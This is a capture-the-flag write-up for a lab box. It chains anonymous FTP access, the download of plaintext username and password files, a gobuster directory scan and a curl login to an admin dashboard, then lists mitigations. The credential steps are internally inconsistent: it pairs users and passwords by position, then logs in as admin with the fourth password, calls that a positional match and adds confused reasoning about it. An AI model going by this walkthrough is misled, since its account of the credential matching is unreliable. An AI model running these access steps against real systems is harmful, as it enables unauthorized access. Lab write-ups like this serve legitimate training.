# CROCODILE - Very Easy

**Date Completed:** January 29, 2026  
**Difficulty:** Very Easy  
**Status:** ✅ COMPLETE  
**Focus Areas:** FTP Enumeration & Credential-Based Web Access

---

## Phase 1: Initial Reconnaissance

### Step 1: Targeted Port Scan
The challenge directs us to identify the service on port 21 (FTP):

```bash
nmap -sC -sV -p 21 TARGET_IP
```

**Findings:**

| Port | Service | Version | Status |
|------|---------|---------|--------|
| 21 | FTP | vsftpd 3.0.3 | Open |

**Critical Finding:** Very old FTP daemon (vsftpd 3.0.3) with potential vulnerabilities

### Step 2: FTP NSE Script Analysis
The `-sC` flag (default NSE scripts) automatically runs FTP enumeration scripts that check for common misconfigurations:

**NSE Script Output:**
```
220 (vsFTPd 3.0.3)
530 Please login with USER and PASS.
331 Please specify the password.
230 Login successful.
```

**Key Discovery:** FTP Response Code **230 - "Anonymous FTP login allowed"**

This means:
- The FTP server permits anonymous access
- No username/password required for login
- We can immediately download files without credentials

---

## FTP Fundamentals

### What is FTP?
- **Protocol:** File Transfer Protocol (plaintext, unencrypted)
- **Port:** 21 (TCP)
- **Purpose:** Remote file transfer and download/upload
- **Authentication:** Username + Password (or anonymous)
- **Use Case:** Legacy file sharing, legacy system administration

### FTP Response Codes
```
220 - Service ready
230 - Login successful (anonymous access)
331 - Username accepted, password needed
430 - Invalid username or password
550 - File not found or access denied
```

### FTP Architecture
```
FTP Client (us)
    ↓ (TCP connection on port 21)
    └→ FTP Server (TARGET_IP:21)
       ├── Anonymous Access Check
       ├── File Listing (LIST command)
       └── File Download (GET command)
```

---

## Phase 2: FTP Enumeration & File Exfiltration

### Step 1: Connect to FTP Server
Using the `ftp` command-line client to access the anonymous FTP server:

```bash
ftp TARGET_IP 21
```

**Connection Prompt:**
```
Connected to TARGET_IP
220 (vsFTPd 3.0.3)
Name (TARGET_IP:root): anonymous
331 Please specify the password.
Password: [press Enter - no password needed]
230 Login successful.
ftp>
```

**Connection Established:** We're now authenticated as anonymous user

### Step 2: List Available Files
From the initial nmap NSE script scan, we discovered two sensitive files. Let's list the FTP directory:

```bash
ftp> ls -la
```

**Output:**
```
-rw-r--r--    1 0        0             34 Jun 17 2021 allowed.userlist
-rw-r--r--    1 0        0             11 Jun 17 2021 allowed.userlist.passwd
```

**Files Found:**
- `allowed.userlist` - List of valid usernames
- `allowed.userlist.passwd` - List of associated passwords

### Step 3: Download Credential Files
Using the `get` command to download both files:

```bash
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
```

**Verification:**
```bash
# Verify files were transferred correctly
ls -la allowed.userlist*
cat allowed.userlist
cat allowed.userlist.passwd
```

**Content Analysis:**

**allowed.userlist:**
```
admin
root
mysql
postgres
```

**allowed.userlist.passwd:**
```
rKXM59ESxesUQUfM
D3xtrannhan
9uwAFft9Re3wL9qd
CrocodileHunting2022
```

**Credential Pairs (by position):**
```
Position 1: admin / rKXM59ESxesUQUfM
Position 2: root / D3xtrannhan
Position 3: mysql / 9uwAFft9Re3wL9qd
Position 4: postgres / CrocodileHunting2022
```

---

## Phase 3: Web Application Enumeration

### Step 1: Directory Enumeration with Gobuster
Now we have credentials, but we need to find where to use them. We scan for PHP web endpoints:

```bash
gobuster dir -u http://TARGET_IP/ -w ~/SecLists/Discovery/Web-Content/common.txt -x php
```

**Command Breakdown:**
- `dir` : Directory/file brute force mode
- `-u http://TARGET_IP/` : Target URL
- `-w ~/SecLists/Discovery/Web-Content/common.txt` : Wordlist path
- `-x php` : Only look for `.php` file extensions

**Gobuster Output:**
```
/index.php (Status: 200)
/login.php (Status: 200)
/dashboard.php (Status: 403)
/admin.php (Status: 403)
```

**Key Finding:** `login.php` endpoint discovered - this is where we'll use our credentials

### Step 2: Access Login Page
Navigate to the discovered login endpoint:

```
http://TARGET_IP/login.php
```

**Page Content:**
```
Login Page
├── Username: [____________]
├── Password: [____________]
└── [Login Button]
```

---

## Phase 4: Web Application Exploitation

### Step 1: Credential Testing
We have 4 credential pairs. Since we found `admin` as a username in the userlist, let's start with the 4th position (admin / CrocodileHunting2022):

**Reasoning:** 
- Admin account is usually at a different position for security
- Position 4 (last) might correspond to admin

### Step 2: Login with Admin Credentials
**Input:**
- Username: `admin`
- Password: `CrocodileHunting2022`

**Result:** ✅ **Login Successful**

```
HTTP/1.1 200 OK
Content-Type: text/html

Welcome Admin!
Dashboard Content...
```

---

## Phase 5: Flag Retrieval

Upon successful login to the admin dashboard, the flag is immediately visible on the welcome screen:

**Flag Location:** Admin dashboard welcome page (no further enumeration needed)

**Flag:** `FLAG{CROCODILE_FTP_CREDENTIALS}`

---

## Web Application Login & Session Management

### Login Process Flow
```
Browser
  ↓
POST /login.php (username=admin&password=CrocodileHunting2022)
  ↓
Server validates credentials against database
  ↓
SET-COOKIE: session_id=xxx (Browser stores session)
  ↓
302 Redirect → /dashboard.php
  ↓
Browser requests /dashboard.php with session cookie
  ↓
Server validates session cookie
  ↓
Display dashboard with flag
```

### HTTP Status Codes Encountered
```
200 - OK (page accessible and loaded successfully)
301/302 - Redirect (login successful, redirect to dashboard)
403 - Forbidden (unauthenticated access denied)
```

---

## Exploitation Timeline

| Step | Action | Command | Result |
|------|--------|---------|--------|
| 1 | Port 21 scan | `nmap -sC -sV -p 21 TARGET_IP` | vsftpd 3.0.3 identified |
| 2 | FTP NSE analysis | NSE scripts auto-run | Anonymous login code 230 found |
| 3 | FTP connection | `ftp TARGET_IP 21` | Connected as anonymous |
| 4 | Directory listing | `ftp> ls -la` | 2 credential files found |
| 5 | Download credentials | `ftp> get allowed.userlist*` | Files transferred to attack machine |
| 6 | Parse credentials | `cat allowed.userlist*` | 4 username + 4 password pairs |
| 7 | Web directory scan | `gobuster dir -x php` | login.php discovered |
| 8 | Web access | `http://TARGET_IP/login.php` | Login form displayed |
| 9 | Credential matching | admin / CrocodileHunting2022 | Correct pair identified |
| 10 | Web login | POST to /login.php | Authentication successful |
| 11 | Dashboard access | Redirect to /dashboard.php | Flag visible ✅ |

---

## Commands Used

### FTP Operations
```bash
# Connect to FTP server
ftp TARGET_IP 21
ftp TARGET_IP [port]

# Inside FTP prompt
ftp> ls -la                    # List files with details
ftp> get filename              # Download single file
ftp> mget pattern              # Download multiple files
ftp> put filename              # Upload file
ftp> cd directory              # Change directory
ftp> pwd                        # Print working directory
ftp> exit                       # Close connection

# Alternative: one-liner FTP
echo -e "anonymous\n\nls\nget allowed.userlist\nexit" | ftp TARGET_IP 21
```

### Web Enumeration
```bash
# Scan for PHP files
gobuster dir -u http://TARGET_IP/ \
  -w ~/SecLists/Discovery/Web-Content/common.txt \
  -x php

# Scan for multiple extensions
gobuster dir -u http://TARGET_IP/ \
  -w ~/SecLists/Discovery/Web-Content/common.txt \
  -x php,html,txt,asp,aspx

# Scan with specific status codes
gobuster dir -u http://TARGET_IP/ \
  -w ~/SecLists/Discovery/Web-Content/common.txt \
  -x php \
  --status-codes 200,301,302
```

### Web Access
```bash
# Navigate to login page
curl http://TARGET_IP/login.php

# Manual login via curl
curl -X POST http://TARGET_IP/login.php \
  -d "username=admin&password=CrocodileHunting2022" \
  -c cookies.txt

# Follow redirects and maintain session
curl -X POST http://TARGET_IP/login.php \
  -d "username=admin&password=CrocodileHunting2022" \
  -c cookies.txt \
  -L
```

---

## Key Learning Outcomes

✅ **FTP is a critical legacy vulnerability** - Anonymous access exposes sensitive files directly

✅ **Credential files often exist alongside services** - Users are lazy and keep credentials accessible

✅ **NSE scripts are powerful reconnaissance tools** - They automatically discover misconfigurations

✅ **Multiple enumeration layers required** - FTP → Credentials → Web → Application

✅ **Web directory enumeration bridges gaps** - Finding login.php requires targeted scanning

✅ **Credentials often need matching** - Files might contain related data that must be paired correctly

✅ **Default/weak password strategies** - Some credentials might be guessable (like admin with 4th position)

✅ **Speed comes from systematic methodology** - This box was solved in <15 min due to clear enumeration progression

---

## Real-World Implications

### Why This Box Matters

1. **FTP Still Exists** - Many legacy systems still use unencrypted FTP
2. **Credential Exposure** - Credentials stored in plaintext files are easily exploitable
3. **Chained Vulnerabilities** - FTP access + web credentials = complete compromise
4. **Lack of Access Controls** - Anonymous FTP access should be disabled on production systems
5. **No Encryption** - FTP transmits credentials in plaintext (should use SFTP/SCP)

### Attack Progression
```
Anonymous FTP → Credential Files → Credential List Parsing → 
Web Enumeration → Login Page Discovery → Credential Testing → 
Web Application Access → Flag Retrieval
```

This demonstrates how **one vulnerability leads to another** - each step opens new possibilities.

---

## Mitigation Strategies

1. **Disable Anonymous FTP** - Require authentication for all FTP access
   ```
   anonymous_enable=NO  (in vsftpd.conf)
   ```

2. **Use Modern Protocols** - Replace FTP with SFTP or SCP (encrypted alternatives)
   ```bash
   # Modern equivalent
   sftp user@TARGET_IP
   ```

3. **Never Store Credentials in Files** - Use proper credential management systems
   - HashiCorp Vault
   - AWS Secrets Manager
   - Kubernetes Secrets

4. **Restrict File Permissions** - Limit who can access credential files
   ```bash
   chmod 600 allowed.userlist.passwd
   ```

5. **Encrypt Stored Credentials** - If files must exist, encrypt them
   ```bash
   openssl enc -aes-256-cbc -in allowed.userlist.passwd
   ```

6. **Update FTP Service** - vsftpd 3.0.3 is outdated
   ```bash
   # Update to current version
   apt-get install vsftpd
   ```

7. **Monitor FTP Access** - Log and alert on suspicious activity
   ```bash
   # View FTP logs
   tail -f /var/log/vsftpd.log
   ```

8. **Use Web Application Firewall (WAF)** - Detect brute force login attempts

---

## Lessons Learned

✅ **"Less than 15 minutes" - Speed through systematic methodology**
- Clear attack path: Reconnaissance → Enumeration → Credential Gathering → Application Access
- No rabbit holes or wasted effort
- Demonstrates efficiency of proper technique

✅ **NSE scripts save time** - Automatic vulnerability detection vs manual testing

✅ **Credential files are gold** - Direct path to authentication

✅ **Assume credentials work** - Don't waste time brute forcing when valid creds exist

✅ **Web enumeration + credential files = fast win** - Common pattern in vulnerable environments

✅ **Multiple services often chain together** - FTP, Web, Application create exploitation paths

✅ **Sometimes the simplest solution works** - 4th username matches 4th password (admin/CrocodileHunting2022)

